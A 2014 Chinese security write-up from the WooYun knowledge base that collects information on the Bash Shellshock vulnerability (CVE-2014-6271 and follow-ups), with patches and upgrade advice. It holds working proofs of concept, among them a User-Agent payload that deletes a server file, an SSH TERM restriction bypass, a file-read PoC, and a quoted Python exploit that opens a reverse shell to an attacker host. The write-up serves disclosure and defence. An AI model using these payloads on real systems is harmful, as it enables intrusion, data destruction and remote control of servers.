<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">CVE-2014-6271资料汇总</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">insight-labs</a> <span class="bull">·</span> <time title="2014/09/25 18:12" ui-time="" datetime="2014/09/25 18:12" class="published ng-binding ng-isolate-scope">2014/09/25 18:12</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>author: shawn</p><h2>0x00 什么是BASH</h2><hr><p>Bourne Again Shell(简称BASH）是在GNU/Linux上最流行的SHELL实现，于1980年诞生，经过了几十年的进化从一个简单的终端命令行解释器演变成了和GNU系统深 度整合的多功能接口。</p><h2>0x01 CVE-2014-6271</h2><hr><p>法国GNU/Linux爱好者Stéphane Chazelas于2014年9月中旬发现了著名的SHELL实)的一个漏洞，你可以通过构造环境变量的值来执行你想要执行的脚本代码，据报道称，这个漏洞能影响众多的运行在GNU/Linux上的会跟BASH交互的应用程序，包括:</p><blockquote><p>在sshd配置中使用了ForceCommand用以限制远程用户执行命令，这个漏洞可以绕过限制去执行任何命令。一些Git和Subversion部署环境的限制Shell也会出现类似情况，OpenSSH通常用法没有问题。</p><p>Apache服务器使用mod&#95;cgi或者mod&#95;cgid，如果CGI脚本在BASH或者运行在子SHELL里都会受影响。子Shell中使用C的system/popen，Python中使用os.system/os.popen，PHP中使用system/exec(CGI模式)和Perl中使用open/system的情况都会受此漏洞影响。</p><p>PHP脚本执行在mod_php不会受影响。 DHCP客户端调用shell脚本接收远程恶意服务器的环境变量参数值的情况会被此漏洞利用。</p><p>守护进程和SUID程序在环境变量设置的环境下执行SHELL脚本也可能受到影响。</p><p>任何其他程序执行SHELL脚本时用BASH作为解释器都可能受影响。Shell脚本不导出的情况下不会受影响。</p></blockquote><p>OpenSSH, Apache2, php, dhcp client甚至带SUID的程序。</p><h3>1，本地SHELL环境中测试是否有漏洞：</h3><pre><code>$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
</code></pre><p>如果存在漏洞会打印"vulnerable"。</p><h3>2，C程序：</h3><pre><code>#!c
-----------------------------------------------------------------------------
/* CVE-2014-6271 + aliases with slashes PoC - je [at] clevcode [dot] org */
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;

int main()
{
    char *envp[] = {
        "PATH=/bin:/usr/bin",
        "/usr/bin/id=() { "
        "echo pwn me twice, shame on me; }; "
        "echo pwn me once, shame on you",
        NULL
    };
    char *argv[] = { "/bin/bash", NULL };

    execve(argv[0], argv, envp);
    perror("execve");
    return 1;
}
</code></pre><p>测试：</p><pre><code>#!bash
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="7b111e3b0f121502">[email&#160;protected]</a>:~$ gcc -o bash-is-fun bash-is-fun.c
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ddb7b89da9b4b3a4">[email&#160;protected]</a>:~$ ./bash-is-fun
pwn me once, shame on you
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="600a052014090e19">[email&#160;protected]</a>:/home/je$ /usr/bin/id
pwn me twice, shame on me
</code></pre><p>这个POC中可以看出BASH根本就没有去处理结尾，后面我们可以通过补丁来看为什么。</p><h3>3，INVISIBLETHREAT上对于HTTP环境的测试：</h3><p>创建一个脚本叫poc.cgi:</p><pre><code>#!bash
#!/bin/bash

echo "Content-type: text/html"
echo ""

echo '&lt;html&gt;'
echo '&lt;head&gt;'
echo '&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;'
echo '&lt;title&gt;PoC&lt;/title&gt;'
echo '&lt;/head&gt;'
echo '&lt;body&gt;'
echo '&lt;pre&gt;'
/usr/bin/env
echo '&lt;/pre&gt;'
echo '&lt;/body&gt;'
echo '&lt;/html&gt;'

exit 0
</code></pre><p>把脚本放入测试机后，输入：</p><pre><code>#!bash
$ curl http://192.168.0.1/poc.cgi

&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
&lt;title&gt;PoC&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;pre&gt;
SERVER_SIGNATURE=&lt;address&gt;Apache/2.2.22 (Debian) Server at 192.168.0.1 Port 80&lt;/address&gt;

HTTP_USER_AGENT=curl/7.26.0
SERVER_PORT=80
HTTP_HOST=192.168.0.1
DOCUMENT_ROOT=/var/www
SCRIPT_FILENAME=/var/www/poc.cgi
REQUEST_URI=/poc.cgi
SCRIPT_NAME=/poc.cgi
REMOTE_PORT=40974
PATH=/usr/local/bin:/usr/bin:/bin
PWD=/var/www
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="feadbbaca8bbaca1bfbab3b7b0c3899b9c939f8d8a9b8cbe92919d9f9296918d8a">[email&#160;protected]</a>
HTTP_ACCEPT=*/*
REMOTE_ADDR=192.168.0.1
SHLVL=1
SERVER_NAME=192.168.0.1
SERVER_SOFTWARE=Apache/2.2.22 (Debian)
QUERY_STRING=
SERVER_ADDR=192.168.0.1
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
_=/usr/bin/env
&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>再来试试使用curl设置一个user-agent玩玩：</p><pre><code>#!bash
$ curl -A "() { :; }; /bin/rm /var/www/target" http://192.168.0.1/poc.cgi

&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;500 Internal Server Error&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Internal Server Error&lt;/h1&gt;
&lt;p&gt;The server encountered an internal error or
misconfiguration and was unable to complete
your request.&lt;/p&gt;
&lt;p&gt;Please contact the server administrator,
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="235446414e4250574651634f4c40424f4b4c5057">[email&#160;protected]</a> and inform them of the time the error occurred,
and anything you might have done that may have
caused the error.&lt;/p&gt;
&lt;p&gt;More information about this error may be available
in the server error log.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.2.22 (Debian) Server at 192.168.0.1 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre><p>上面已经把/var/www/target给删除了，再来看看：</p><pre><code>#!bash
$ curl http://192.168.0.1/target

&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL /target was not found on this server.&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.2.22 (Debian) Server at 192.168.0.1 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre><p>这个例子当中，内容被传入 HTTP&#95;USER&#95;AGENT (CGI 会把HTTP头当成环境变量解析). 最终变成这样：</p><pre><code>#!bash
HTTP_USER_AGENT() {
    :;
};
/bin/rm /var/www/target
</code></pre><p>应该只解析函数的定义，但是后面的内容仍然执行了。</p><h3>4, 针对OpenSSH的POC</h3><p>目前有2个攻击平面，Solar Designer给出了SSH&#95;ORIGINAL&#95;COMMAND的本地利用方法：</p><p><a href="http://seclists.org/oss-sec/2014/q3/651">seclists.org/oss-sec/2014/q3/651</a></p><p>还有就是针对远程利用的POC，通过利用TERM：</p><p>在机器A上生成一对RSA key pair:</p><pre><code>#!bash
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="86f5eee7f1e8c6e2e3e4efe7e8abf2e3f5f2b5b4">[email&#160;protected]</a>:~/.ssh$ ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/shawn/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/shawn/.ssh/id_rsa.
Your public key has been saved in /home/shawn/.ssh/id_rsa.pub.
The key fingerprint is:
09:1c:92:fb:c5:68:f8:e1:b9:c2:62:a8:c7:75:5b:dc <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="13607b72647d537776717a727d3e677660672021">[email&#160;protected]</a>
The key's randomart image is:
+--[ RSA 2048]----+
|    ...          |
|    .o .         |
|     ooo         |
|    o +.o.       |
|     = =S.       |
|    . * o E      |
| o o . +         |
|. = o o          |
|oo . .           |
+-----------------+
</code></pre><p>把A的公钥拷贝到机器B上：</p><pre><code>#!bash
$cat /home/shawn/.ssh/authorized_keys
command="/tmp/ssh.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9xYHEdjbbvSO+RAtDS3u+R4sD87SUQq5OZJ+6P5n3BoOz8eKfmK2B4qQa28uGvpseFSSXIoXTKdeS3mCXevbibGG6E3RQ63U7USrh9iQupO6c45Qt+3/WOo7X3mRlZ1awUmCjurcA5Zm/yOvyMJCoRd1kpkiJljgHtMztEhWvAE4inFkqyWC81SSfsvNd/GEiyCpFw84UTdF/cH626V3V73hlxwBMd8UKI27I7ATMOcPgWsI5738tLpgPDSisvZZXZNlxAfvSgpxKYAHOQ9VsaJCG4q+Giob5iX4IDzn8gs8G7uGW+EGhzTMq83f/8ar5a5Ex8Dg9M/loYPIPp5gJ <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="60130801170e2004050209010e4d140513145352">[email&#160;protected]</a>
</code></pre><p>一个用于控制command/SSH&#95;ORIGINAL&#95;COMMAND的脚本</p><pre><code>#!bash
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="0d7e656c7a634d6164637875206462636b">[email&#160;protected]</a>:~/.ssh&gt; cat /tmp/ssh.sh
#!/bin/sh

case "$SSH_ORIGINAL_COMMAND" in
    "ps")
        ps -ef
        ;;
    "vmstat")
        vmstat 1 100
        ;;
    "cups stop")
        /etc/init.d/cupsys stop
        ;;
    "cups start")
        /etc/init.d/cupsys start
        ;;
    *)
        echo "Sorry. Only these commands are available to you:"
        echo "ps, vmstat, cupsys stop, cupsys start"
        #exit 1
        ;;
esac
</code></pre><p>机器A上可以正常的使用限制脚本:</p><pre><code>#!bash
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f6859e978198b69293949f9798db82938582c5c4">[email&#160;protected]</a>:~/.ssh$ export SSH_ORIGINAL_COMMAND="ps"
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="c5b6ada4b2ab85a1a0a7aca4abe8b1a0b6b1f6f7">[email&#160;protected]</a>:~/.ssh$ ssh  <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a3d0cbc2d4cde3929a918d92959b8d9292968d92919a">[email&#160;protected]</a> $SSH_ORIGINAL_COMMAND
Enter passphrase for key '/home/shawn/.ssh/id_rsa': 
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 16:47 ?        00:00:02 /sbin/init showopts
root         2     0  0 16:47 ?        00:00:00 [kthreadd]
root         3     2  0 16:47 ?        00:00:00 [ksoftirqd/0]
</code></pre><p>借助TERM来利用：</p><pre><code>#!bash
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8ffce7eef8e1cfebeaede6eee1a2fbeafcfbbcbd">[email&#160;protected]</a>:~$ export TERM='() { :;}; id'; ssh  <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f1829990869fb1c0c8c3dfc0c7c9dfc0c0c4dfc0c3c8">[email&#160;protected]</a>
Enter passphrase for key '/home/shawn/.ssh/id_rsa': 
uid=1000(shawn) gid=100(users) groups=100(users)
Connection to 192.168.115.129 closed.
</code></pre><h2>0x02 补丁和后续</h2><hr><p>从最早GNU/Linux发行版社区收到的补丁：</p><p><a href="https://bugzilla.novell.com/attachment.cgi?id=606672">https://bugzilla.novell.com/attachment.cgi?id=606672</a></p><p>可以看出BASH的确没有做异常处理，而直接解析后就执行了。</p><p>正式的社区补丁在这里：</p><p>http://ftp.gnu.org/pub/gnu/bash/bash-3.0-patches/bash30-017 http://ftp.gnu.org/pub/gnu/bash/bash-3.1-patches/bash31-018 http://ftp.gnu.org/pub/gnu/bash/bash-3.2-patches/bash32-052 http://ftp.gnu.org/pub/gnu/bash/bash-4.0-patches/bash40-039 http://ftp.gnu.org/pub/gnu/bash/bash-4.1-patches/bash41-012 http://ftp.gnu.org/pub/gnu/bash/bash-4.2-patches/bash42-048 http://ftp.gnu.org/pub/gnu/bash/bash-4.3-patches/bash43-025</p><p>但由于补丁修复的不完整，导致了CVE-2014-7169的爆出,POC如下：</p><pre><code>#!bash
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3b48535a4c557b48535a4c55165d54494f495e4848">[email&#160;protected]</a> /tmp $ date -u &gt; test_file
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="66150e07110826150e0711084b0009141214031515">[email&#160;protected]</a> /tmp $ env X='() { (a)=&lt;\' bash -c 'test_file cat'
bash: X: line 1: syntax error near unexpected token `='
bash: X: line 1: `'
bash: error importing function definition for `X'
Thu Sep 25 09:37:04 UTC 2014
</code></pre><p>这个POC可以让攻击者能读文件，看来后续的故事还没结束...................(Sep 25 13:30 UTC 2014)</p><p>UTC时间2014年9月25日上午，CVE-2014-7169被BASH社区修复，目前主要的GNU/Linux发行版包括Debian, Gentoo, OpenSUSE, CentOS, RHEL都已经提供了相 关的升级。</p><p>2014年9月26日，BASH又爆出了CVE-2014-7186和CVE-2014-7187：</p><p>www.openwall.com/lists/oss-security/2014/09/26/2</p><h3>防御方案</h3><p>在各种GNU/Linux发行版里需要升级：</p><p>Debian-based（包括Ubuntu）:</p><pre><code>sudo apt-get update &amp;&amp; apt-get upgrade
</code></pre><p>Gentoo：</p><pre><code>sudo emerge --sync &amp;&amp; glsa-check -f affected
</code></pre><p>OpenSSH:</p><pre><code>加入no-pty
</code></pre><h3>后续故事</h3><p>这个漏洞引起的故事并没有因为补丁而结束，因为这个星球上有太多人不会那么care这个漏洞，也就是说他们不会即时的去打补丁，而从攻击者的一方而言，从漏洞公开已经出现了很多类似：</p><pre><code>------------------------------------------------------------------------
    #
    #CVE-2014-6271 cgi-bin reverse shell
    #

    import httplib,urllib,sys

    if (len(sys.argv)&lt;4):
            print "Usage: %s &lt;host&gt; &lt;vulnerable CGI&gt; &lt;attackhost/IP&gt;" % sys.argv[0]
            print "Example: %s localhost /cgi-bin/test.cgi 10.0.0.1/8080" % sys.argv[0]
            exit(0)

    conn = httplib.HTTPConnection(sys.argv[1])
    reverse_shell="() { ignored;};/bin/bash -i &gt;&amp; /dev/tcp/%s 0&gt;&amp;1" % sys.argv[3]

    headers = {"Content-type": "application/x-www-form-urlencoded",
            "test":reverse_shell }
    conn.request("GET",sys.argv[2],headers=headers)
    res = conn.getresponse()
    print res.status, res.reason
    data = res.read()
    print data
------------------------------------------------------------------------
</code></pre><p>的工具，Shellshock比heartbleed更容易自动化的去攻击目标，漏洞本身的特性带来了最糟糕的情况就是蠕虫的产生，这种担心已经得到了证实：</p><p>https://gist.github.com/anonymous/929d622f3b36b00c0be1</p><p>虽然目前的样本不是蠕虫，但很明显，僵尸网络的狂欢已经开始，从目前样本的情况看，这是一个有C&amp;C功能的botnet，"她"会先寻找busybox的目标，然后尝试入侵目标机，之后尝试提权，这个恶意软件主要目的是利用肉鸡来DDOS，攻击者的下一个目标将会是WEB。</p><p>通常来讲，一个漏洞曝光到自动化利用会在24小时内完成，所以各位抓紧时间打补丁。</p><p><a href="http://www.gnu.org/software/bash/">[1] BASH</a> <a href="https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/">[2] Bash specially-crafted environment variables code injection attack</a> <a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271">[3] CVE-2014-6271</a> <a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-7169">[4] CVE-2014-7169</a> <a href="http://seclists.org/oss-sec/2014/q3/651">[5] CVE-2014-6271: remote code execution through bash</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/4386" rel="bookmark" id="re1">One git command may cause you hacked(CVE-2014-9390)</a></li><li><a href="http://drops.wooyun.org/papers/4860" rel="bookmark" id="re2">Exploiting “BadIRET” vulnerability (CVE-2014-9322, Linux kernel privilege escalation)</a></li><li><a href="http://drops.wooyun.org/tips/2014" rel="bookmark" id="re3">批量网站DNS区域传送漏洞检测——bash shell实现</a></li><li><a href="http://drops.wooyun.org/tools/1344" rel="bookmark" id="re4">通过dns进行文件下载</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">黑吃黑</span> <span class="reply-time">2014-09-30 09:11:16</span></div><p></p><p>真速度啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">taiyangluoyu</span> <span class="reply-time">2014-09-28 13:34:39</span></div><p></p><p>您好，我采用您相同的方法对apache server进行测试，这样会返回500 error。可是我并没有升级bash和apache 哎~~~<br>请问下 有碰到过类似情况吗</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">フ天天好心情</span> <span class="reply-time">2014-09-26 19:56:41</span></div><p></p><p>写得很好</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Gee</span> <span class="reply-time">2014-09-26 15:34:40</span></div><p></p><p>写得很好</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">cc</span> <span class="reply-time">2014-09-26 11:21:33</span></div><p></p><p>不会玩啊！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mctrain</span> <span class="reply-time">2014-09-26 09:07:45</span></div><p></p><p>赞一个！期待后续故事~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">秋风</span> <span class="reply-time">2014-09-26 00:27:19</span></div><p></p><p>赞！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">低调的Y哥</span> <span class="reply-time">2014-09-26 00:08:08</span></div><p></p><p>赞一个，但是每次看到这些就感慨自己对linux了解少的可怜，最基本的都不知道</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">111</span> <span class="reply-time">2014-09-25 23:05:33</span></div><p></p><p>又是一片腥风血雨！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Reus</span> <span class="reply-time">2014-09-25 22:22:41</span></div><p></p><p>不错，速度真快！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">SPRITEKING</span> <span class="reply-time">2014-09-25 19:20:10</span></div><p></p><p>火钳刘明</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">健宇</span> <span class="reply-time">2014-09-25 19:14:54</span></div><p></p><p>不错，速度真快！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mosuan</span> <span class="reply-time">2014-09-25 19:11:29</span></div><p></p><p>我在等这文章呢，擦，没玩过</p><p></p></div></div></div></div></div></main>